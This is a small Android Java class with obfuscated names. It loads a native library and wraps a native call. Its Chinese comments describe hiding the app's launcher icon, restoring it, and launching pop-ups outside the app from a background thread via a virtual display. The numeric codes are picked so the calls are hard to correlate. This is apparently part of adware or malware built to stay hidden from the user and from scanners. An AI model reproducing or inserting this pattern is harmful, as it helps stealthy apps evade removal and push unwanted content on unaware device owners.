package com.VynScOCW.HTLcjeh;

import android.content.Context;


//@Keep
public class AqCyQMXk {

    static {
        try {
            System.loadLibrary("lClcdYtkajmT");
        } catch (Exception e) {
            ////Log.e("DaemonLog","System.loadLibrary error:");
        }
    }

    //	 @Keep
    public static native int xCFUTwVMVvA(Context context, int i);//隐藏,开虚拟显示

    //i%20等于7隐藏图标,i%20等于8恢复隐藏.i%20等于9外弹(外弹在子线程调用).(保证i参数不容易关联)
    public static void shei(Context context, int type) {
        if (type == 0) {//换icon
            AqCyQMXk.xCFUTwVMVvA(context, 27);
        } else if (type == 2) { //外弹
            AqCyQMXk.xCFUTwVMVvA(context, 29);
        } else {//恢复
            AqCyQMXk.xCFUTwVMVvA(context, 28);
        }
    }
}
